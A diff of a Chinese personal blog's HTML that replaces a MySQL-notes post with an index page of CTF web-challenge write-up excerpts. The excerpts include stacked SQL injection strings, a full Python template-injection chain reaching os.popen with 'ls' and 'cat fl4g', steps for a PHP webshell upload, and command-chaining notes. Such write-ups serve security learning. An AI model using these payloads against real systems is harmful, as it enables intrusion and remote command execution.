@@ -6,7 +6,7 @@
     
     
     
-    <title>mysql知识点 | MrzBlog</title>
+    <title>MrzBlog</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
     
     <meta name="theme-color" content="#77AAFF">
@@ -39,24 +39,15 @@
 
 
     
-    <meta name="description" content="[TOC] Sql知识点去重统计岗位数量 连接查询找出每个员工的部门名字和上级领导以及薪资等级，在一张表中呈现   嵌套子查询找出每个部门平均薪资的等级                                                                                             image-20200424195818187">
-<meta property="og:type" content="article">
-<meta property="og:title" content="mysql知识点">
-<meta property="og:url" content="http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+    <meta name="description" content="No way">
+<meta property="og:type" content="website">
+<meta property="og:title" content="MrzBlog">
+<meta property="og:url" content="http://rookiez996.github.io/page/2/index.html">
 <meta property="og:site_name" content="MrzBlog">
-<meta property="og:description" content="[TOC] Sql知识点去重统计岗位数量 连接查询找出每个员工的部门名字和上级领导以及薪资等级，在一张表中呈现   嵌套子查询找出每个部门平均薪资的等级                                                                                             image-20200424195818187">
+<meta property="og:description" content="No way">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200427115210929.png">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200424195818187.png">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200424195846234.png">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200424200318318.png">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200430142457042.png">
-<meta property="og:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200503114054028.png">
-<meta property="article:published_time" content="2020-06-19T12:43:55.688Z">
-<meta property="article:modified_time" content="2020-06-19T13:04:56.141Z">
 <meta property="article:author" content="Zzzy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://rookiez996.github.io/images/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/image-20200427115210929.png">
     
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
@@ -69,7 +60,7 @@
 
 <body>
     <div id="loading" class="active"></div>
-    <aside id="menu"  class="hide" >
+    <aside id="menu"   >
   <div class="inner flex-row-vertical">
     <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
         <i class="icon icon-lg icon-close"></i>
@@ -156,7 +147,7 @@
         <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
-        <div class="flex-col header-title ellipsis">mysql知识点</div>
+        <div class="flex-col header-title ellipsis">MrzBlog</div>
         
         <div class="search-wrap" id="search-wrap">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
@@ -173,16 +164,19 @@
         </a>
     </div>
 </header>
-<header class="content-header post-header">
+<header class="content-header index-header">
     
     
     <div class="container fade-scale">
         <div id="myheader">
             <h1 class="title">
+                 
+                    MrzBlog
                 
             </h1>
             <h5 class="subtitle">
                 
+                    在Web全栈的道路上努力前行
                 
             </h5>
         </div>
@@ -190,47 +184,400 @@
 
 </header>
 
-
 <div class="container body-wrap">
+    <ul class="post-list">
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Sql知识点"><span class="post-toc-number">1.</span> <span class="post-toc-text">Sql知识点</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#去重"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">去重</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#连接查询"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">连接查询</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#嵌套子查询"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">嵌套子查询</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#找出每个部门平均薪资的等级"><span class="post-toc-number">1.3.0.0.1.</span> <span class="post-toc-text">找出每个部门平均薪资的等级</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Limit的使用（mysql特有的）"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Limit的使用（mysql特有的）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#表的复制"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">表的复制</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#将查询结果插入表中"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">将查询结果插入表中</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#修改数据"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">修改数据</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#删除数据"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">删除数据</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#约束"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">约束</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#非空约束：创建一个员工表，姓名不得为空"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">非空约束：创建一个员工表，姓名不得为空</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#唯一性约束："><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">唯一性约束：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#列级约束"><span class="post-toc-number">1.9.2.1.</span> <span class="post-toc-text">列级约束</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#表级约束"><span class="post-toc-number">1.9.2.2.</span> <span class="post-toc-text">表级约束</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#主键约束"><span class="post-toc-number">1.9.3.</span> <span class="post-toc-text">主键约束</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#外键约束"><span class="post-toc-number">1.9.4.</span> <span class="post-toc-text">外键约束</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mysql中的存储引擎"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">Mysql中的存储引擎</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MyISAM"><span class="post-toc-number">1.10.1.</span> <span class="post-toc-text">MyISAM</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#InnoDB"><span class="post-toc-number">1.10.2.</span> <span class="post-toc-text">InnoDB</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Memory"><span class="post-toc-number">1.10.3.</span> <span class="post-toc-text">Memory</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#事务"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">事务</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Demo对比commit和rollback"><span class="post-toc-number">1.11.1.</span> <span class="post-toc-text">Demo对比commit和rollback</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Demo尝试四种隔离级别-此处不给例子"><span class="post-toc-number">1.11.2.</span> <span class="post-toc-text">Demo尝试四种隔离级别(此处不给例子)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#索引"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">索引</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#添加条件"><span class="post-toc-number">1.12.1.</span> <span class="post-toc-text">添加条件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#索引语法"><span class="post-toc-number">1.12.2.</span> <span class="post-toc-text">索引语法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实现原理"><span class="post-toc-number">1.12.3.</span> <span class="post-toc-text">实现原理</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#视图"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">视图</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#数据备份"><span class="post-toc-number">1.14.</span> <span class="post-toc-text">数据备份</span></a></li></ol></li></ol>
-        </nav>
-    </aside>
-   
-<article id="post-mysql知识点"
-  class="post-article article-type-post fade" itemprop="blogPost">
+        <li class="post-list-item fade">
+            <article id="post-Web_php_unserialize&amp;supersqli&amp;easy_tornado"
+  class="article-card article-type-post" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">mysql知识点</h1>
-        <div class="post-meta">
-            <i class="icon icon-lg icon-calendar-o"></i>
-            发表于
-            <time class="post-time" title="2020-06-19 20:43:55" datetime="2020-06-19T12:43:55.688Z"  itemprop="datePublished">2020-06-19</time>
+    
 
-            <br id="mybreak"/>
-            
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/Web_php_unserialize&supersqli&easy_tornado/">Web_php_unserialize&amp;supersqli&amp;easy_tornado</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 12:34:28" datetime="2020-06-20T04:34:28.766Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><strong>审计+绕过</strong></p>
+<p>绕过点1.正则表达式，将数字前加上“+”</p>
+<p>绕过点2.wakeup函数，将序列化后的属性个数改成一个大于实际属性个数的值</p>
+<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--1(骚方法)</span><br><span class="line">?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;-- +</span><br><span class="line"></span><br><span class="line">--2(加id)</span><br><span class="line">inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int;--+</span><br><span class="line"></span><br><span class="line">--3改（id）</span><br><span class="line">?inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` change `flag`  `id` varchar(255);--+</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>模板注入</p>
+<p>1.进入hints.txt得到filehash的构造形式，如下图</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2020/06/20/Web_php_unserialize&amp;supersqli&amp;easy_tornado/Users\朱盈\AppData\Roaming\Typora\typora-user-images\image-20200508171933542.png" alt="image-20200508171933542" title="">
+                </div>
+                <div class="image-caption">image-20200508171933542</div>
+            </figure>
+
+<p>2.来到flag.txt得到flag的路径，即图中的filename，现在只需得到cookie_secret</p>
+<p>3.不构造filehash直接访问/fllllllllllllag,发现url中有get传参msg，可能存在注入。</p>
+<p>4.查询得知cookie_secret在handler.settings中，传参?msg=得到cookie_setting</p>
+<p>5.按照filehash的形式构造哈希传入即可得到flag</p>
+<p><strong>handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。路由表，它将指定的url规则和handler挂接起来，形成一个路由映射表。当请求到来时，根据请求的访问url查询路由映射表来找到相应的业务handler。</strong></p>
+<p>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p>
 <script>
-	mybreak.style="display:none";
-</script>
-
-
-            <i>·</i>
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
-</span>
-
-
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/Web_php_unserialize&supersqli&easy_tornado/" class="post-more waves-button">
+                Continue reading...
+            </a>
         </div>
-        <div class="post-count-custom">
-            <i class="icon icon-lg icon-comment-o"></i>
-            阅读本文可能花费您&nbsp;<span class="post-count">5</span>&nbsp;分钟
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-unserialize3&amp;upload1&amp;Web_python_template_injection"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/unserialize3&upload1&Web_python_template_injection/">unserialize3&amp;upload1&amp;Web_python_template_injection</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 12:34:18" datetime="2020-06-20T04:34:18.562Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>wakeup函数在反序列化之前调用。</p>
+<p>如果序列化后声明的的属性个数大于实际的属性个数，就可绕过wakeup函数。</p>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>审计源码发现只支持jpg或png后缀</p>
+<p>编辑一句话代码，虚晃一枪将后缀改为jpg</p>
+<p>上传时抓包，更改回php后缀，木马植入成功。</p>
+<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>题目提示python模板注入</p>
+<p>1.首先尝试url/49回显49 说明存在注入</p>
+<p>2.接着找到os</p>
+<p>2.1找到str类</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.2找到str类的父类object</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.3找object类中的引用列表</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.4找到处于下标71的os的所在类site._Painter</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.5找到os</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.6执行命令为所欲为</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.7得到flag</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/unserialize3&upload1&Web_python_template_injection/" class="post-more waves-button">
+                Continue reading...
+            </a>
         </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <p>[TOC]</p>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-Web_php_include&amp;ics-06"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/Web_php_include&ics-06/">Web_php_include&amp;ics-06</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 12:33:18" datetime="2020-06-20T04:33:18.790Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <p>1.thinkphp 5.0.20 </p>
+<p>rce命令执行漏洞</p>
+<p>2.怎么利用webshell，怎么植入一个webshell</p>
+<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>1.strstr()函数对大小写敏感，利用大写PHP绕过过滤</p>
+<p><strong>php://input</strong>不是很了解，但是题目基本能做</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2020/06/20/Web_php_include&amp;ics-06/MyBlog\hexo\source\images\Web_php_include&amp;ics-06\image-20200620123346556.png" alt="image-20200620123346556" title="">
+                </div>
+                <div class="image-caption">image-20200620123346556</div>
+            </figure>
+
+<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>观察到url中有id，进行爆破即可</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/Web_php_include&ics-06/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-jother编码"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/jother%E7%BC%96%E7%A0%81/">jother编码</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 12:32:40" datetime="2020-06-20T04:32:40.883Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <p><strong>alert([function(){alert(1);}()])</strong></p>
+<p>这个例子说明alert里面是可以执行函数的</p>
+<p><strong>alert([])弹窗</strong></p>
+<p>说明[]是一个最简单的匿名函数</p>
+<p><strong>+[]</strong></p>
+<p>加号强制将[]函数返回值void转化为数值，结果为0</p>
+<p><strong>![]</strong></p>
+<p>!强制将void转化为false</p>
+<p><strong>!![]</strong></p>
+<p>同理，这个为true，+!![]为1</p>
+<p>那么就可以得到1-9的数字了</p>
+<p><strong>{}+[]</strong></p>
+<p>可以得到字符串“[object Object]” 又丰富了一个字符”o”</p>
+<p>现在可以构造如下形式执行js的任意代码</p>
+<p><img src="/2020/06/20/jother%E7%BC%96%E7%A0%81/D:%5CMyBlog%5Chexo%5Csource%5Cimages%5Cjother%E7%BC%96%E7%A0%81%5Cimage-20200503211934647.png" alt="image-20200503211934647"></p>
+<p>附：md5(‘0e215962017’)==’0e291242476940776845150308577824’</p>
+<p><strong>参考博客：<a href="https://blog.csdn.net/weixin_33755554/article/details/87981545?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33755554/article/details/87981545?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1</a></strong></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/jother%E7%BC%96%E7%A0%81/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-0503命令执行漏洞"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/0503%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">0503命令执行漏洞</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 12:31:54" datetime="2020-06-20T04:31:54.725Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <p>命令执行漏洞</p>
+<p>A&amp;&amp;B表示A执行成功，才能执行B</p>
+<p>A&amp;B是简单拼接，没有制约关系</p>
+<p>A|B表示A的输出作为B的输入执行</p>
+<p>A||B表示A执行失败才执行B</p>
+<p>A;B表示先执行A在执行B</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/0503%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-mysql知识点"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/">mysql知识点</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-19 20:43:55" datetime="2020-06-19T12:43:55.688Z"  itemprop="datePublished">2020-06-19</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <p>[TOC]</p>
 <h1 id="Sql知识点"><a href="#Sql知识点" class="headerlink" title="Sql知识点"></a>Sql知识点</h1><h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><p>统计岗位数量</p>
 <h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p>找出每个员工的部门名字和上级领导以及薪资等级，在一张表中呈现</p>
 <img src="/images/mysql知识点/image-20200427115210929.png" alt="image-20200427115210929" style="zoom:67%;">
@@ -374,117 +721,27 @@
             document.body.appendChild(img);
           });
       </script>
-        </div>
-
-        <blockquote class="post-copyright">
-    <div class="content">
-        
-<span class="post-time">
-    Last updated: <time datetime="2020-06-19T13:04:56.141Z" itemprop="dateUpdated">2020-06-19 21:04:56</time>
-</span>
-
-
-        
-        原文链接：<a href="/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" target="_blank" rel="external">http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/</a>
-        
-    </div>
-    <footer>
-        <div onclick="location.href='http://RookieZ996.github.io'">
-            <img src="/img/avatar.jpg" alt="Zzzy">
-            <a>Zzzy</a>
-        </div>
-    </footer>
-</blockquote>
-
-        
-    <div class="page-reward">
-        <nav class="myreward">
-            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
-        </nav>
-    </div>
-
-
-
-        <div class="post-footer">
-            
-
-            
-<div class="page-share-wrap">
     
+        <div class="post-more-div">
+            <a href="/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
 
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&title=《mysql知识点》 — MrzBlog&pic=http://RookieZ996.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&title=《mysql知识点》 — MrzBlog&source=No way" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《mysql知识点》 — MrzBlog&url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&via=http://RookieZ996.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
+        </li>
+    
     </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
 
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2020/06/20/0503%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="post-prev" class="post-nav-link">
-        <h4 class="title" >
-          上一篇：0503命令执行漏洞
-        </h4>
-      </a>
+<nav id="page-nav">
+    <div class="inner">
+    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
     </div>
-  
-
-  
 </nav>
 
-
-
-    
-    
-
-    
-
-    
-
-
-</article>
 
 </div>
 
@@ -530,83 +787,8 @@
 
     </main>
     
-        
-<div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        <span>感谢您的鼓励支持！</span>
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <div class="reward-content">
-        
-        <div class="reward-code">
-            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
-        </div>
-        
-        <label class="reward-toggle">
-            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
-                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
-            <div class="reward-toggle-ctrol">
-                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
-                <span class="reward-toggle-item alipayPay">支付宝</span>
-            </div>
-        </label>
-        
-        <i class="icon icon-caret-up"></i>
-    </div>
-</div>
-
-
